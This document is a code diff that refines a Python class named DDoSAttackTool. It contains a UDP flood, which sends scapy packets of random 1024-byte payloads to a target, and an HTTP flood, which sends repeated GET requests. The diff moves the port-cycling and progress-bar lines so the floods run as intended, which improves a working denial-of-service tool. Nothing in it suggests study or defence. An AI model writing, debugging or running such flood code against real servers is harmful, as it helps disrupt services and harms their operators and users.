@@ -83,9 +83,9 @@ class DDoSAttackTool:
                 for _ in range(num_packets):
                     scapy.send(scapy.IP(dst=target) / scapy.UDP(dport=port) / scapy.RandString(1024))
                     self.attack_num += 1
-                    port = (port + 1) % 65535
                     print(f"Sent {self.attack_num} packet to {target} through port: {port}")
                     time.sleep(burst_interval)
+                port = (port + 1) % 65535  # Move this line outside the inner loop
         except Exception as e:
             print("An error occurred during the UDP flood attack:", e)
 
@@ -125,9 +125,9 @@ class DDoSAttackTool:
                     for i in range(num_packets):
                         requests.get(url, headers=headers)
                         self.attack_num += 1
-                        bar.update(i + 1)
                         print(f"Sent {self.attack_num} HTTP request to {url}")
                         time.sleep(burst_interval)
+                        bar.update(i + 1)
         except Exception as e:
             print("An error occurred during the HTTP flood attack:", e)
 
